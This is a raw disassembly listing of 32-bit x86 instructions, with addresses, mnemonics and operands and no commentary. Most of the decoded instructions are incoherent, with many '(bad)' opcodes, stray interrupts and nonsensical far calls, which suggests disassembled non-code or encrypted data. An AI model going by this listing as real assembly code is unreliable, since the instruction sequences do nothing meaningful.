  4249bb:	cmp    ecx,DWORD PTR [edi]
  4249bd:	shr    ebx,cl
  4249bf:	xchg   edx,eax
  4249c0:	add    al,0xfb
  4249c2:	inc    DWORD PTR [ebp*2+0x28ead33c]
  4249c9:	push   ebx
  4249ca:	adc    eax,DWORD PTR [ecx-0x69325a73]
  4249d0:	and    al,0xa
  4249d2:	jbe    0x4249f0
  4249d4:	int    0x76
  4249d6:	stc    
  4249d7:	int    0x8d
  4249d9:	stc    
  4249da:	add    al,0x2
  4249dc:	(bad)  
  4249dd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249e0:	repnz sub bl,dl
  4249e3:	mov    ebp,0xcdd35392
  4249e8:	lea    esp,[edi+ebp*1]
  4249eb:	mov    ebx,0x7d33867e
  4249f0:	pop    esi
  4249f1:	lea    esp,[ebp+0xa4072f]
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	int    0x8
  4249fb:	and    eax,0x43808081
  424a00:	sbb    al,0xd6
  424a02:	cmp    ecx,ebp
  424a04:	lea    edx,[ecx]
  424a06:	int    0x8
  424a08:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a0e:	lods   eax,DWORD PTR ds:[esi]
  424a0f:	(bad)  
  424a10:	int    0x96
  424a12:	adc    DWORD PTR [ebx],edi
  424a14:	(bad)  
  424a16:	sti    
  424a17:	call   ebx
  424a19:	jmp    0x4249ad
  424a1b:	shr    edx,cl
  424a1d:	sub    BYTE PTR [ebx-0x1d],dl
  424a20:	int    0x8d
  424a22:	dec    esp
  424a23:	bound  eax,QWORD PTR [eax]
  424a25:	xchg   ecx,eax
  424a26:	xchg   esp,eax
  424a27:	pop    ebx
  424a28:	add    BYTE PTR [eax+0x24],dh
  424a2b:	push   es
  424a2c:	ins    DWORD PTR es:[edi],dx
  424a2d:	das    
  424a2e:	add    eax,0x808092d9
  424a33:	int    0x96
  424a35:	and    al,0xcd
  424a37:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a3d:	or     ch,0x7d
  424a40:	cmp    ecx,DWORD PTR [edi]
  424a42:	add    al,0x11
  424a44:	call   ebx
  424a46:	jmp    0x4249da
  424a48:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a4e:	add    eax,0x808081da
  424a53:	int    0x76
  424a55:	std    
  424a56:	int    0x8d
  424a58:	std    
  424a59:	cmp    edi,DWORD PTR [ecx+0x4]
  424a5c:	add    bh,bh
  424a5e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424a64:	push   ebx
  424a65:	ror    DWORD PTR [edx],cl
  424a67:	jbe    0x424a26
  424a69:	pop    ebp
  424a6a:	push   0xcf35869f
  424a6f:	jl     0x424a1e
  424a71:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424a77:	leave  
  424a78:	jbe    0x424abf
  424a7a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424a80:	shr    al,1
  424a82:	lahf   
  424a83:	xchg   BYTE PTR ds:0xc955760a,dh
  424a89:	jbe    0x424af8
  424a8b:	dec    ecx
  424a8c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424a92:	xchg   esp,eax
  424a93:	iret   
  424a94:	inc    ebp
  424a95:	shl    ebx,cl
  424a97:	xchg   edx,eax
  424a98:	adc    bh,bl
  424a9a:	scas   eax,DWORD PTR es:[edi]
  424a9b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424aa1:	lea    esi,[eax+eax*1+0x0]
  424aa5:	add    BYTE PTR [esi+0x4],ch
  424aa8:	cli    
  424aa9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aaf:	xchg   BYTE PTR ds:0x94060a,dh
  424ab5:	add    BYTE PTR [eax],al
  424ab7:	or     al,BYTE PTR [esi]
  424ab9:	mov    esp,0xa000000
  424abe:	jbe    0x424a70
  424ac0:	or     dh,BYTE PTR [esi+0x15]
  424ac3:	iret   
  424ac4:	outs   dx,BYTE PTR ds:[esi]
  424ac5:	std    
  424ac6:	iret   
  424ac7:	jno    0x424b39
  424ac9:	or     dh,BYTE PTR [esi+0x2d]
  424acc:	or     dh,BYTE PTR [esi+0x35]
  424acf:	leave  
  424ad0:	push   es
  424ad1:	jo     0x424ad3
  424ad3:	add    BYTE PTR [eax],al
  424ad5:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424adb:	pushf  
  424adc:	add    BYTE PTR [eax],al
  424ade:	add    BYTE PTR [edx],cl
  424ae0:	pop    ss
  424ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ae2:	add    BYTE PTR [eax],al
  424ae4:	add    cl,cl
  424ae6:	push   es
  424ae7:	lods   al,BYTE PTR ds:[esi]
  424ae8:	add    BYTE PTR [eax],al
  424aea:	add    BYTE PTR [edx-0x61],cl
  424aed:	xchg   BYTE PTR ds:0xb406c9,dh
  424af3:	add    BYTE PTR [eax],al
  424af5:	sbb    BYTE PTR [edi+0x6c93586],bl
  424afb:	les    eax,FWORD PTR [eax]
  424afd:	add    BYTE PTR [eax],al
  424aff:	popa   
  424b00:	lahf   
  424b01:	xchg   BYTE PTR ds:0x9006c9,dh
  424b07:	add    BYTE PTR [eax],al
  424b09:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b0f:	aam    0x0
  424b11:	add    BYTE PTR [eax],al
  424b13:	call   0xa77d1b7
  424b18:	iret   
  424b19:	fadd   QWORD PTR [eax]
  424b1b:	add    BYTE PTR [eax],al
  424b1d:	leave  
  424b1e:	push   es
  424b1f:	in     al,0x0
  424b21:	add    BYTE PTR [eax],al
  424b23:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b29:	add    ecx,ecx
  424b2b:	jbe    0x424b32
  424b2d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b33:	or     ecx,ecx
  424b35:	jbe    0x424b03
  424b37:	inc    ecx
  424b38:	lahf   
  424b39:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b3f:	jbe    0x424b66
  424b41:	pusha  
  424b42:	lahf   
  424b43:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b49:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b4f:	int3   
  424b50:	push   es
  424b51:	jo     0x424b53
  424b53:	add    BYTE PTR [eax],al
  424b55:	shr    ebx,cl
  424b57:	xchg   edx,eax
  424b58:	add    DWORD PTR [edx],eax
  424b5a:	scas   eax,DWORD PTR es:[edi]
  424b5b:	or     esp,ecx
  424b5d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424b61:	add    BYTE PTR [esp+eax*1-0x7],ch
  424b65:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424b6b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424b75:	add    BYTE PTR [eax-0x7c],dh
  424b78:	int    0xb3
  424b7a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424b80:	inc    esp
  424b81:	add    BYTE PTR [eax],al
  424b83:	add    BYTE PTR [edx+0x70],ah
  424b86:	add    BYTE PTR [ecx-0x78],dh
  424b89:	or     dh,BYTE PTR [esi+0x7d]
  424b8c:	iret   
  424b8d:	jbe    0x424b4c
  424b8f:	jo     0x424b5e
  424b91:	or     BYTE PTR ds:0x808081,ah
  424b97:	push   eax
  424b98:	int    0x76
  424b9a:	jge    0x424b9c
  424b9c:	icebp  
  424b9d:	int    0x76
  424b9f:	std    
  424ba0:	int    0x8d
  424ba2:	std    
  424ba3:	cmp    edi,DWORD PTR [ecx+0x4]
  424ba6:	add    bh,bh
  424ba8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bae:	push   ebx
  424baf:	ror    DWORD PTR [edx],cl
  424bb1:	jbe    0x424bc0
  424bb3:	int    0x8d
  424bb5:	std    
  424bb6:	int    0x76
  424bb8:	std    
  424bb9:	cmp    ecx,DWORD PTR [edi]
  424bbb:	add    al,0x11
  424bbd:	call   ebx
  424bbf:	lods   eax,DWORD PTR ds:[esi]
  424bc0:	sub    bl,dl
  424bc2:	jmp    0x424b56
  424bc4:	push   ebx
  424bc5:	jge    0x424b94
  424bc7:	jbe    0x424b86
  424bc9:	inc    ebx
  424bca:	rcl    esp,cl
  424bcc:	xchg   esi,eax
  424bcd:	or     dh,BYTE PTR [esi+0x75]
  424bd0:	in     al,dx
  424bd1:	das    
  424bd2:	int    0x80
  424bd4:	int    0x8d
  424bd6:	jne    0x424be2
  424bd8:	jbe    0x424b97
  424bda:	int    0x76
  424bdc:	mov    ebp,0x4dd4d343
  424be1:	int    0x70
  424be3:	sbb    al,0xcd
  424be5:	mov    bl,0x25
  424be7:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424bf1:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424bfb:	int    0xb3
  424bfd:	sub    eax,0xcd808081
  424c02:	xchg   esi,eax
  424c03:	dec    esp
  424c04:	int    0x62
  424c06:	cmp    al,0x87
  424c08:	xor    DWORD PTR [edx],ecx
  424c0a:	jo     0x424c30
  424c0c:	int    0x76
  424c0e:	stc    
  424c0f:	int    0x8d
  424c11:	stc    
  424c12:	cmp    edi,DWORD PTR [ecx+0x4]
  424c15:	add    bh,bh
  424c17:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c1d:	push   ebx
  424c1e:	ror    DWORD PTR [edx],cl
  424c20:	jbe    0x424c2f
  424c22:	int    0x96
  424c24:	and    al,0x9a
  424c26:	pop    ebx
  424c27:	mov    ebp,0xf5e2
  424c2c:	push   es
  424c2d:	ins    DWORD PTR es:[edi],dx
  424c2e:	das    
  424c2f:	add    eax,0x80808099
  424c34:	add    dh,dl
  424c36:	and    al,0xcd
  424c38:	lock pop ebx
  424c3a:	mov    ebp,0xf52c
  424c3f:	push   es
  424c40:	ins    DWORD PTR es:[edi],dx
  424c41:	das    
  424c42:	add    eax,0x808080c5
  424c47:	int    0x76
  424c49:	and    al,0xcd
  424c4b:	lock int 0xd5
  424c4e:	mov    ebp,0xfbe7
  424c53:	push   es
  424c54:	ins    DWORD PTR es:[edi],dx
  424c55:	das    
  424c56:	add    eax,0x808080d1
  424c5b:	call   0x0:0xf90ebd5b
  424c62:	push   es
  424c63:	ins    DWORD PTR es:[edi],dx
  424c64:	das    
  424c65:	add    eax,0x8080802d
  424c6a:	int    0x8
  424c6c:	and    eax,0x43808081
  424c71:	sbb    al,0xd6
  424c73:	sbb    cl,ch
  424c75:	or     BYTE PTR [ecx],dl
  424c77:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424c81:	int    0x8d
  424c83:	dec    esp
  424c84:	add    BYTE PTR [ecx+0x70005b94],dl
  424c8a:	and    al,0xcd
  424c8c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424c92:	or     ch,0x7d
  424c95:	cmp    ecx,DWORD PTR [edi]
  424c97:	add    al,0x11
  424c99:	call   ebx
  424c9b:	jmp    0x424c2f
  424c9d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424ca3:	(bad)
  424ca7:	dec    ecx
  424ca8:	and    BYTE PTR [esi-0x778932cb],al
  424cae:	int    0x8d
  424cb0:	mov    ch,cl
  424cb2:	jbe    0x424cd8
  424cb4:	shr    ebx,cl
  424cb6:	xchg   edx,eax
  424cb7:	adc    al,BYTE PTR [edx]
  424cb9:	scas   eax,DWORD PTR es:[edi]
  424cba:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424cc0:	sbb    ch,cl
  424cc2:	ins    BYTE PTR es:[edi],dx
  424cc3:	cmp    al,0xcd
  424cc5:	lea    ebp,[edi+eax*4]
  424cc8:	lds    ecx,FWORD PTR [edx]
  424cca:	outs   dx,BYTE PTR ds:[esi]
  424ccb:	adc    al,0xcd
  424ccd:	jbe    0x424cfb
  424ccf:	leave  
  424cd0:	add    BYTE PTR [edi-0x327f7f80],0x76
  424cd7:	sub    al,0xa
  424cd9:	pushf  
  424cda:	test   ch,cl
  424cdc:	jbe    0x424d0e
  424cde:	int    0x8d
  424ce0:	sub    al,0xa
  424ce2:	outs   dx,BYTE PTR ds:[esi]
  424ce3:	mov    ch,cl
  424ce5:	jbe    0x424cfb
  424ce7:	int    0x8d
  424ce9:	sub    al,0xa
  424ceb:	outs   dx,BYTE PTR ds:[esi]
  424cec:	dec    esp
  424ced:	in     al,dx
  424cee:	adc    al,0xcd
  424cf0:	jbe    0x424d16
  424cf2:	int    0x6c
  424cf4:	cmp    al,0xcd
  424cf6:	lea    ebp,[edi+eax*4]
  424cf9:	lds    ecx,FWORD PTR [edx]
  424cfb:	outs   dx,BYTE PTR ds:[esi]
  424cfc:	adc    al,0xcd
  424cfe:	jbe    0x424d2c
  424d00:	add    al,0x2c
  424d02:	or     cl,0x76
  424d05:	icebp  
  424d06:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d10:	cmp    ebx,ebp
  424d12:	int    0xc5
  424d14:	arpl   sp,bp
  424d16:	xchg   edx,eax
  424d17:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d1a:	test   al,0xcb
  424d1c:	shl    BYTE PTR [eax+eax*4],cl
  424d1f:	xchg   esi,eax
  424d20:	int    0xed
  424d22:	jno    0x424d95
  424d24:	das    
  424d25:	mov    ebx,0x74cf146e
  424d2a:	mov    BYTE PTR [edi+ebp*1],bl
  424d2d:	mov    ebx,0x9a5b867e
  424d32:	leave  
  424d33:	jbe    0x424d32
  424d35:	dec    ecx
  424d36:	and    DWORD PTR [esi-0x672f5cb],eax
  424d3c:	push   es
  424d3d:	retf   
  424d3e:	aam    0xb4
  424d40:	popa   
  424d41:	shl    DWORD PTR [ecx],1
  424d43:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d49:	out    0x88,al
  424d4b:	xchg   edx,edi
  424d4d:	pop    esi
  424d4e:	out    0x4c,al
  424d50:	or     BYTE PTR [ebp-0x33],0xdc
  424d54:	mov    BYTE PTR [edi-0x77197806],al
  424d5a:	pop    esi
  424d5b:	out    0x4c,al
  424d5d:	cmp    BYTE PTR [edx-0x33],0x8d
  424d61:	std    
  424d62:	int    0xe6
  424d64:	std    
  424d65:	cmp    edx,DWORD PTR [ebx]
  424d67:	add    al,0xf8
  424d69:	call   ebx
  424d6b:	jmp    0xd41e1a98
  424d70:	in     al,dx
  424d71:	xchg   edx,eax
  424d72:	push   ebx
  424d73:	cld    
  424d74:	add    al,0xf2
  424d76:	std    
  424d77:	add    al,0xd3
  424d79:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424d80:	sub    BYTE PTR [ebx-0x6],dl
  424d83:	adc    bh,al
  424d85:	dec    ecx
  424d86:	and    DWORD PTR [esi-0x2197ecb],eax
  424d8c:	int    0x8d
  424d8e:	std    
  424d8f:	int    0xe6
  424d91:	std    
  424d92:	cmp    edx,DWORD PTR [ebx]
  424d94:	add    al,0xf8
  424d96:	call   ebx
  424d98:	jmp    0x424d2c
  424d9a:	shr    ecx,cl
  424d9c:	sub    BYTE PTR [ebx-0x10],dl
  424d9f:	inc    ebx
  424da0:	(bad)  
  424da1:	stc    
  424da2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424da9:	ror    BYTE PTR [eax-0x12326980],cl
  424daf:	add    al,0xed
  424db1:	push   eax
  424db2:	leave  
  424db3:	jbe    0x424d5a
  424db5:	mov    edx,0xc98080ac
  424dba:	jbe    0x424d71
  424dbc:	xchg   eax,ecx
  424dbe:	add    BYTE PTR [eax-0x68528937],0x40
  424dc5:	add    BYTE PTR [eax-0x51068937],0x30
  424dcc:	test   BYTE PTR [eax-0x4a028937],al
  424dd2:	lods   al,BYTE PTR ds:[esi]
  424dd3:	add    BYTE PTR [eax+0x69f176c9],0x53
  424dda:	add    BYTE PTR [eax-0x76a8937],0x42
  424de1:	add    BYTE PTR [eax-0x78628937],0x80
  424de8:	add    BYTE PTR [eax-0x2c428937],0xb8
  424def:	add    BYTE PTR [eax-0x32128937],0x71
  424df6:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424dfd:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e04:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e0a:	(bad)  
  424e0b:	stc    
  424e0c:	cmp    ebx,edx
  424e0e:	clc    
  424e0f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e15:	repnz popa 
  424e17:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e1d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e24:	add    BYTE PTR [eax+0x3cded312],0x80
  424e2b:	or     cl,0x76
  424e2e:	cmc    
  424e2f:	icebp  
  424e30:	lea    eax,[eax-0x2893680]
  424e36:	jnp    0x424e0c
  424e38:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e3f:	add    BYTE PTR [eax-0x32068933],0x96
  424e46:	std    
  424e47:	ss dec eax
  424e49:	pushf  
  424e4a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e51:	int    0xe3
  424e53:	push   esi
  424e54:	jp     0x424e55
  424e56:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e5d:	int    0x76
  424e5f:	std    
  424e60:	xchg   DWORD PTR [esi-0x78],esi
  424e63:	int    0x96
  424e65:	std    
  424e66:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424e6c:	xor    ch,cl
  424e6e:	jbe    0x424e81
  424e70:	int    0x96
  424e72:	in     eax,dx
  424e73:	sbb    BYTE PTR ss:[edi-0x80],cl
  424e77:	cmp    BYTE PTR [ebx],0xd2
  424e7a:	int    0x96
  424e7c:	mov    ebp,0xe261d253
  424e81:	fadd   DWORD PTR [eax-0x320ecc80]
  424e87:	jbe    0x424e3e
  424e89:	xchg   DWORD PTR [ebx],edx
  424e8b:	popa   
  424e8c:	fist   WORD PTR [eax+eax*4-0x80]
  424e90:	xor    esi,ecx
  424e92:	xchg   DWORD PTR [esi-0x5a893253],edx
  424e98:	int    0xd6
  424e9a:	xor    ch,cl
  424e9c:	out    0x9d,al
  424e9e:	adc    bh,bl
  424ea0:	mov    DWORD PTR [ecx-0x80],esi
  424ea3:	sub    BYTE PTR [ebx],0xf1
  424ea6:	int    0x76
  424ea8:	xchg   ebp,eax
  424ea9:	adc    bh,bl
  424eab:	mov    dh,0x2c
  424ead:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424eb4:	clc    
  424eb5:	int    0x96
  424eb7:	icebp  
  424eb8:	push   esi
  424eb9:	out    0x1e,al
  424ebb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424ec2:	icebp  
  424ec3:	adc    dh,bl
  424ec5:	pop    es
  424ec6:	push   edx
  424ec7:	add    BYTE PTR [eax+0x72f9943],0x63
  424ece:	add    BYTE PTR [eax],al
  424ed0:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424ed6:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424edd:	pop    ebx
  424ede:	cwde   
  424edf:	call   0x8043:0xd9ed76c9
  424ee6:	or     cl,0x76
  424ee9:	adc    DWORD PTR [edx+0x7e],esi
  424eec:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424ef3:	add    BYTE PTR [eax+0xbf976c9],0x71
  424efa:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f01:	add    BYTE PTR [eax-0x275a8937],0x58
  424f08:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f0f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f16:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f1d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f24:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f2b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f32:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f39:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f40:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f47:	add    BYTE PTR [eax-0x32528933],0x8d
  424f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f4f:	dec    ebp
  424f50:	bound  ebp,QWORD PTR [ebx]
  424f52:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f59:	dec    ebp
  424f5a:	pop    ds
  424f5b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424f61:	pop    edi
  424f62:	xchg   ecx,eax
  424f63:	mov    bh,0x7e
  424f65:	stc    
  424f66:	xor    edi,DWORD PTR [ebp-0x33]
  424f69:	jbe    0x424f68
  424f6b:	int    0x96
  424f6d:	stc    
  424f6e:	sub    edx,edx
  424f70:	int    0x96
  424f72:	cmc    
  424f73:	dec    ebp
  424f74:	inc    edi
  424f75:	outs   dx,DWORD PTR ds:[esi]
  424f76:	add    BYTE PTR [eax-0x69322dcd],0x11
  424f7d:	xor    edx,edx
  424f7f:	int    0x96
  424f81:	in     eax,dx
  424f82:	push   ebx
  424f83:	sar    BYTE PTR [ebx],cl
  424f85:	fisubr DWORD PTR [ecx-0x27]
  424f88:	ret    
  424f89:	add    BYTE PTR [eax],al
  424f8b:	clc    
  424f8c:	test   ebp,0x72c34c96
  424f92:	push   ds
  424f93:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424f9a:	int    0xd6
  424f9c:	mov    ch,0x33
  424f9e:	leave  
  424f9f:	das    
  424fa0:	sar    DWORD PTR [ecx+0x69],1
  424fa3:	fisttp DWORD PTR [edx]
  424fa5:	xchg   ecx,eax
  424fa6:	mov    ebx,ebp
  424fa8:	popa   
  424fa9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424fb0:	push   esp
  424fb1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424fb8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fbf:	add    BYTE PTR [eax-0x7e5a8937],0x80
  424fc6:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  424fcd:	pop    ebp
  424fce:	call   0xcdf4:0xf880806f
  424fd5:	xchg   esi,eax
  424fd6:	lods   eax,DWORD PTR ds:[esi]
  424fd7:	int    0xa6
  424fd9:	mov    BYTE PTR [ebx-0x2e],dl
  424fdc:	int    0x96
  424fde:	popf   
  424fdf:	xor    edx,edx
  424fe1:	int    0x96
  424fe3:	xchg   ebp,eax
  424fe4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  424fe6:	push   eax
  424fe7:	add    BYTE PTR [eax-0x302d2ed1],0x5
  424fee:	mov    BYTE PTR [eax+0x2c],bl
  424ff1:	ret    0xafd
  424ff4:	jbe    0x424f8b
  424ff6:	int    0x76
  424ff8:	icebp  
  424ff9:	int    0x96
  424ffb:	or     eax,0xf3f7f534
  425000:	int    0x96
  425002:	xchg   ebp,eax
  425003:	xor    al,0x23
  425005:	inc    esp
  425006:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42500a:	inc    esi
  42500b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425012:	rol    esi,0x80
  425015:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42501c:	cmp    ebx,edx
  42501e:	clc    
  42501f:	hlt    
  425020:	int    0x96
  425022:	gs mov edi,0xc3d9
  425028:	ss aaa 
  42502a:	push   esi
  42502b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425032:	add    BYTE PTR [eax],al
  425034:	xchg   DWORD PTR [ebp-0x33],edi
  425037:	jbe    0x425036
  425039:	int    0x96
  42503b:	stc    
  42503c:	sub    edx,edx
  42503e:	int    0x96
  425040:	cmc    
  425041:	dec    ebp
  425042:	inc    edi
  425043:	outs   dx,DWORD PTR ds:[esi]
  425044:	add    BYTE PTR [eax-0x69322dcd],0x11
  42504b:	xor    edx,edx
  42504d:	int    0x96
  42504f:	in     eax,dx
  425050:	push   ebx
  425051:	sar    BYTE PTR [ebx],cl
  425053:	(bad)  
  425055:	hlt    
  425056:	int    0x96
  425058:	dec    esp
  425059:	xor    esi,ecx
  42505b:	int    0x76
  42505d:	mov    ebp,0x33b5a6cd
  425062:	leave  
  425063:	das    
  425064:	rol    ebp,1
  425066:	int    0xdb
  425068:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42506e:	das    
  42506f:	pop    es
  425070:	pop    esp
  425071:	add    BYTE PTR [eax],al
  425073:	add    BYTE PTR [edx-0x2d349c58],ch
  425079:	mov    BYTE PTR [eax+0x4edcd96],al
  42507f:	in     eax,dx
  425080:	jo     0x42504b
  425082:	jbe    0x425054
  425084:	xchg   ecx,eax
  425085:	aaa    
  425086:	ficom  WORD PTR [ebx]
  425088:	pop    ebp
  425089:	mov    ebp,0xa25230a
  42508e:	jbe    0x4250e5
  425090:	leave  
  425091:	jbe    0x4250f0
  425093:	mov    esi,0xa13de37
  425098:	jbe    0x4250ff
  42509a:	leave  
  42509b:	jbe    0x42510a
  42509d:	fidiv  WORD PTR [edi]
  42509f:	ficom  WORD PTR [ebx]
  4250a1:	or     dh,BYTE PTR [esi+0x75]
  4250a4:	pop    ebx
  4250a5:	leave  
  4250a6:	jbe    0x425125
  4250a8:	scas   al,BYTE PTR es:[edi]
  4250a9:	aaa    
  4250aa:	ficom  WORD PTR [ebx]
  4250ac:	or     dh,BYTE PTR [esi+0xd]
  4250af:	cwde   
  4250b0:	call   0xde37:0x96f176c9
  4250b7:	adc    ecx,DWORD PTR [edx]
  4250b9:	jbe    0x425050
  4250bb:	cmp    ebx,edx
  4250bd:	cmp    eax,DWORD PTR [eax]
  4250bf:	pop    edi
  4250c0:	dec    ecx
  4250c1:	and    DWORD PTR [esi-0x628936cb],eax
  4250c7:	out    0x37,al
  4250c9:	ficom  WORD PTR [ebx]
  4250cb:	jp     0x4250d7
  4250cd:	jbe    0x425074
  4250cf:	int    0xd3
  4250d1:	or     dl,BYTE PTR [esi-0x4a19f513]
  4250d7:	iret   
  4250d8:	xchg   ecx,eax
  4250d9:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  4250e0:	push   ebx
  4250e1:	ror    bh,cl
  4250e3:	je     0x4250ac
  4250e5:	ror    ch,1
  4250e7:	xor    ch,cl
  4250e9:	pushf  
  4250ea:	test   BYTE PTR [edi],ch
  4250ec:	inc    ebp
  4250ed:	loop   0x425081
  4250ef:	shr    esp,cl
  4250f1:	xchg   edx,eax
  4250f2:	int    0x1c
  4250f4:	int    0x6c
  4250f6:	test   BYTE PTR [ebx],bh
  4250f8:	ins    DWORD PTR es:[edi],dx
  4250f9:	adc    bh,bl
  4250fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250fc:	mov    esi,0xf1534229
  425101:	or     dl,BYTE PTR [esi-0x6893207]
  425107:	xchg   DWORD PTR [ebp-0x2d],ebp
  42510a:	in     eax,0x28
  42510c:	inc    ebx
  42510d:	jbe    0x42515b
  42510f:	das    
  425110:	or     BYTE PTR [edi-0x327f7f80],bh
  425116:	jbe    0x425111
  425118:	add    al,0xb6
  42511a:	mov    ebp,0x11e60a80
  42511f:	int    0x76
  425121:	stc    
  425122:	push   es
  425123:	ins    DWORD PTR es:[edi],dx
  425124:	aam    0xb6
  425126:	cmp    ebp,DWORD PTR [ebp+0xa]
  425129:	out    0xf5,al
  42512b:	int    0x96
  42512d:	mov    ebp,0xcf88a6cd
  425132:	fs xor ch,cl
  425135:	xchg   esi,eax
  425136:	mov    BYTE PTR [edi-0x5269f527],al
  42513c:	retf   0x922
  42513f:	xchg   esi,eax
  425140:	add    ch,cl
  425142:	xchg   esi,eax
  425143:	stc    
  425144:	xchg   ecx,ebx
  425146:	retf   0x2014
  425149:	int    0xa6
  42514b:	lods   eax,DWORD PTR ds:[esi]
  42514c:	or     DWORD PTR [ebx],ebx
  42514e:	retf   0x96
  425151:	int    0xa6
  425153:	stc    
  425154:	xchg   ecx,esp
  425156:	int    0xe6
  425158:	mov    BYTE PTR [ecx],cl
  42515a:	adc    al,0x43
  42515c:	int    0x96
  42515e:	cmc    
  42515f:	ins    BYTE PTR es:[edi],dx
  425160:	add    al,0xea
  425162:	std    
  425163:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425169:	push   ebx
  42516a:	sar    BYTE PTR [ebx],cl
  42516c:	ror    DWORD PTR [edx],cl
  42516e:	jbe    0x425165
  425170:	push   ecx
  425171:	(bad)  
  425172:	cmc    
  425173:	int    0x96
  425175:	cmc    
  425176:	add    al,0x11
  425178:	call   ebx
  42517a:	repz xchg edx,eax
  42517c:	shr    DWORD PTR [ebp-0x322dacd8],cl
  425182:	xchg   esi,eax
  425183:	stc    
  425184:	inc    ebx
  425185:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42518b:	int    0x76
  42518d:	adc    ebp,ecx
  42518f:	xchg   esi,eax
  425190:	stc    
  425191:	int    0xa6
  425193:	mov    ebp,0xcffdad04
  425198:	test   cl,dh
  42519a:	int    0x96
  42519c:	stc    
  42519d:	iret   
  42519e:	adc    al,0x5b
  4251a0:	int    0xa6
  4251a2:	dec    esp
  4251a3:	shl    ebx,cl
  4251a5:	sub    BYTE PTR [ebx-0x2e],dl
  4251a8:	cmp    edx,ebx
  4251aa:	or     dh,BYTE PTR [esi+0x11]
  4251ad:	push   ecx
  4251ae:	(bad)  
  4251af:	adc    ebp,ecx
  4251b1:	xchg   esi,eax
  4251b2:	adc    DWORD PTR [ecx+edx*1],eax
  4251b5:	call   ebx
  4251b7:	repz xchg edx,eax
  4251b9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251bf:	xchg   esi,eax
  4251c0:	stc    
  4251c1:	xchg   edx,ebx
  4251c3:	xor    esp,edx
  4251c5:	or     dh,BYTE PTR [esi-0x43]
  4251c8:	inc    ebx
  4251c9:	lds    ebp,FWORD PTR [edi]
  4251cb:	pop    es
  4251cc:	outs   dx,DWORD PTR ds:[esi]
  4251cd:	add    BYTE PTR [eax],al
  4251cf:	add    ch,cl
  4251d1:	jbe    0x4251c0
  4251d3:	int    0x96
  4251d5:	mov    ch,0x4
